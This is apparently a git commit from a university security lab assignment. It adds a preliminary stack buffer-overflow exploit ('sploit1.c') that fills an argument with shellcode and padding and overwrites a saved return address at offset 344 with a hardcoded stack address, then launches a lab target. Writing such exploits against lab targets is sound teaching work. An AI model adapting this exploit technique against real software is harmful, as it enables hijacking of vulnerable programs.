0e8d918432bb976af634dc5086b12732c0a5eb1c
Benjamin Cheng <ben@bcheng.me>
2022-09-19 15:55:34 -0400

    lab1: sploit1 preliminary version
    Requires the stack to be at 0x7F40A4FD50 rather than 0x40A4FD50.

--- lab1/sploits/sploit1.c
+++ lab1/sploits/sploit1.c
@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -12,8 +13,22 @@ main ( int argc, char * argv[] )
     char *    args[3];
     char *    env[1];
 
+    uint8_t input[370];
+    /* return address lives at $rbp + 8
+     * ($rbp + 8) - buf = 0x158 = 344 */
+    memcpy(input, shellcode, sizeof(shellcode));
+    for (int i = sizeof(shellcode) - 1; i < 344; i++) {
+        input[i] = i % 254 + 1;
+    }
+
+    /* TODO: figure out how to write the high 4 bytes of zero */
+    uint64_t *return_address = (uint64_t *) &input[344];
+    *return_address = 0x40A4FD50;
+    input[348] = 0x7f;
+    input[349] = 0x00;
+
     args[0] = TARGET;
-    args[1] = "hi there";
+    args[1] = (char *) input;
     args[2] = NULL;
 
     env[0] = NULL;
@@ -23,3 +38,4 @@ main ( int argc, char * argv[] )
 
     return (0);
 }
+
